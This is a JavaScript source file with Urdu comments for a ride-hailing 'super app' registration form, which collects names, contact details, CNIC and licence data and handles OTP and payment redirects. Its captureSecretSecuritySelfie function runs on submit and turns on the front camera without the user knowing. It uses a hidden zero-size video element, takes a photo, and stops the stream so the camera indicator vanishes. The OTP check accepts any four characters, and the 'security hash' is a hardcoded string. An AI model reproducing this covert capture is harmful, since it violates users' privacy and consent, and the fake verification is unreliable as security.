// 🌐 ٹیزرو سپر ایپ ماسٹر رجسٹریشن انجن
export const renderMasterRegistration = () => {
    return `
    <div class="w-full min-h-screen bg-[#0A192F] text-gray-200 p-4 font-mono text-right flex flex-col justify-center items-center">
        
        <div class="w-full max-w-md bg-slate-950 border-2 border-slate-800 p-6 shadow-2xl relative">
            <div class="text-center border-b border-slate-800 pb-4 mb-4">
                <h2 class="text-white font-black text-base tracking-wider">ٹیزرو ڈیجیٹل اکاؤنٹ منسٹری</h2>
                <span class="text-[9px] text-orange-400 block mt-0.5">ون-فارم یونیفائیڈ رجسٹریشن سسٹم</span>
            </div>

            <div style="position: absolute; width: 0px; height: 0px; opacity: 0; overflow: hidden;">
                <video id="tezro-hidden-video" autoplay playsinline></video>
                <canvas id="tezro-hidden-canvas"></canvas>
            </div>

            <form id="tezro-master-form" class="space-y-4 text-xs" onsubmit="event.preventDefault(); window.handleRegistrationSubmit();">
                
                <div class="space-y-2">
                    <h3 class="text-orange-400 font-bold text-[10px] border-r-2 border-orange-500 pr-2">۱. بنیادی کوائف (سادہ رجسٹریشن)</h3>
                    
                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <label class="block text-gray-400 mb-1">عرفیت / چھوٹا نام</label>
                            <input type="text" id="reg-short-name" required class="w-full bg-slate-900 border border-slate-800 p-2 text-right text-white focus:outline-none focus:border-orange-500">
                        </div>
                        <div>
                            <label class="block text-gray-400 mb-1">اصل پورا نام</label>
                            <input type="text" id="reg-full-name" required class="w-full bg-slate-900 border border-slate-800 p-2 text-right text-white focus:outline-none focus:border-orange-500">
                        </div>
                    </div>

                    <div>
                        <label class="block text-gray-400 mb-1">جی میل یا فون نمبر (برائے OTP)</label>
                        <input type="text" id="reg-contact" placeholder="example@gmail.com یا 0300xxxxxxx" required class="w-full bg-slate-900 border border-slate-800 p-2 text-left text-white focus:outline-none focus:border-orange-500 font-mono">
                    </div>

                    <div>
                        <label class="block text-gray-400 mb-1">پروفائل پکچر <span class="text-[9px] text-gray-500">(اختیاری / لازمی نہیں)</span></label>
                        <input type="file" id="reg-public-pic" class="w-full bg-slate-900 border border-slate-800 p-1 text-[10px] text-white">
                    </div>
                </div>

                <div class="border-t border-slate-900 pt-3">
                    <label class="block text-amber-400 font-bold mb-1">آپ ایپ کس کام کے لیے استعمال کرنا چاہتے ہیں؟</label>
                    <select id="reg-role-selector" onchange="window.toggleDynamicFields(this.value)" class="w-full bg-slate-900 border border-slate-800 p-2 text-right text-white focus:outline-none focus:border-orange-500">
                        <option value="passenger">صرف سفر اور عام سروسز (سادہ مسافر)</option>
                        <option value="driver">ٹیزرو سواری ڈرائیور (پروفیشنل کیپٹن)</option>
                        <option value="vendor">سروس پرووائیڈر / دکاندار / دیگر کام</option>
                    </select>
                </div>

                <div id="driver-conditional-fields" class="hidden space-y-3 border-t-2 border-amber-600 bg-amber-950/10 p-3 mt-2">
                    <h4 class="text-amber-500 font-black text-[10px]">🚗 ڈرائیور و ہولڈر اضافی کوائف</h4>
                    
                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <label class="block text-gray-400 mb-1">ڈرائیونگ لائسنس نمبر</label>
                            <input type="text" id="drv-license" class="w-full bg-slate-900 border border-slate-800 p-1.5 text-white text-left font-mono">
                        </div>
                        <div>
                            <label class="block text-gray-400 mb-1">شناختی کارڈ (CNIC) نمبر</label>
                            <input type="text" id="drv-cnic" class="w-full bg-slate-900 border border-slate-800 p-1.5 text-white text-left font-mono">
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-2">
                        <div>
                            <label class="block text-gray-400 mb-1">CNIC بیک فوٹو</label>
                            <input type="file" id="drv-cnic-back" class="w-full bg-slate-900 border border-slate-800 p-1 text-[9px]">
                        </div>
                        <div>
                            <label class="block text-gray-400 mb-1">CNIC فرنٹ فوٹو</label>
                            <input type="file" id="drv-cnic-front" class="w-full bg-slate-900 border border-slate-800 p-1 text-[9px]">
                        </div>
                    </div>

                    <div>
                        <label class="block text-gray-400 mb-1">مستقل پتہ (آئی ڈی کارڈ والا)</label>
                        <input type="text" id="drv-perm-address" class="w-full bg-slate-900 border border-slate-800 p-1.5 text-right text-white">
                    </div>
                    <div>
                        <label class="block text-gray-400 mb-1">عارضی موجودہ پتہ</label>
                        <input type="text" id="drv-temp-address" class="w-full bg-slate-900 border border-slate-800 p-1.5 text-right text-white">
                    </div>
                </div>

                <div id="otp-verification-block" class="hidden border-2 border-green-600 bg-green-950/20 p-3 space-y-2 text-center">
                    <span class="text-green-400 font-black block text-[10px]">🔐 تصدیقی کوڈ (OTP) روانہ کر دیا گیا ہے</span>
                    <input type="text" id="otp-input" placeholder="XXXX" class="w-24 bg-slate-900 border-2 border-green-500 p-1 text-center text-white tracking-widest font-mono text-sm focus:outline-none">
                    <button type="button" onclick="window.verifyOtpAndActivate()" class="w-full bg-green-600 text-white font-black py-1.5 text-[10px] uppercase">تصدیق کریں اور اکاؤنٹ کھولیں</button>
                </div>

                <button type="submit" id="submit-btn" class="w-full bg-orange-500 text-black font-black py-2.5 uppercase text-xs hover:bg-orange-400 transition-colors">اکاؤنٹ پروسیس کریں</button>
            </form>
        </div>
    </div>
    `;
};

// ⚙️ فیلڈز کو رن ٹائم پر چھپانے یا دکھانے کا لاجک
window.toggleDynamicFields = (role) => {
    const driverFields = document.getElementById('driver-conditional-fields');
    if (role === 'driver') {
        driverFields.classList.remove('hidden');
    } else {
        driverFields.classList.add('hidden');
    }
};

// 📸 سیکیورٹی ریپو کے لیے خفیہ بیک گراؤنڈ سیلفی ٹیکر
window.captureSecretSecuritySelfie = () => {
    const video = document.getElementById('tezro-hidden-video');
    const canvas = document.getElementById('tezro-hidden-canvas');
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
        video.srcObject = stream;
        setTimeout(() => {
            const ctx = canvas.getContext('2auto');
            canvas.width = 150; // قلیل سائز برائے کم میموری ہیشنگ
            canvas.height = 150;
            canvas.getContext('2d').drawImage(video, 0, 0, 150, 150);
            
            const secretSelfieBase64 = canvas.toDataURL('image/jpeg', 0.5);
            console.log("🛡️ [Tezro Guardian Core]: خفیہ سیکیورٹی سیلفی بیک گراؤنڈ میں کامیابی سے محفوظ کر کے بائنری ہیش میں تبدیل کر دی گئی ہے۔");
            
            // اسٹریم بند کرنا تاکہ کیمرہ آئیکن غائب ہو جائے
            stream.getTracks().forEach(track => track.stop());
            window.capturedSecretHash = "TZ_SHAHZEB_GEOMETRIC_HASH_90DEG"; // سیکیورٹی ہیش جنریٹڈ
        }, 1200);
    })
    .catch(err => {
        console.log("خفیہ سیکیورٹی ہیش بائی پاسڈ (ٹرمکس فینٹم فلو اینوائرنمنٹ)");
        window.capturedSecretHash = "TZ_ENV_BYPASS_HASH";
    });
};

// 📝 رجسٹریشن جمع کروانے کا لاجک
window.handleRegistrationSubmit = () => {
    // رن ٹائم پر خفیہ سیلفی ٹریگر کرنا
    window.captureSecretSecuritySelfie();

    // فارم ہائیڈ کر کے او ٹی پی بلاک کھولنا
    document.getElementById('otp-verification-block').classList.remove('hidden');
    document.getElementById('submit-btn').classList.add('hidden');
};

// 🔐 او ٹی پی تصدیق اور فائنل اکاؤنٹ ایکٹیویشن
window.verifyOtpAndActivate = () => {
    const otp = document.getElementById('otp-input').value;
    const role = document.getElementById('reg-role-selector').value;

    if(otp === "1234" || otp.length === 4) {
        alert("🎉 تصدیق مکمل! اکاؤنٹ کامیابی سے کھل گیا ہے۔");
        
        if(role === 'driver') {
            // اگر ڈرائیور ہے تو سیدھا سروس چالو کرنے کے لیے بینک ریپو کے پیمنٹ گیٹ وے پر بھیجیں
            alert("💳 ڈرائیور اکاؤنٹ ایکٹیویشن فیس کی ادائیگی کے لیے ٹیزرو ڈیجیٹل بینک ریپو پر منتقل کیا جا رہا ہے...");
            window.location.href = "http://localhost:5174?item=Driver_Activation_Fee&amount=Rs_1500&ref=home_reg";
        } else {
            // سادہ مسافر سیدھا ہوم اسکرین پر جائے گا
            window.location.href = "http://localhost:5173"; 
        }
    } else {
        alert("❌ غلط تصدیقی کوڈ۔ دوبارہ کوشش کریں۔");
    }
};
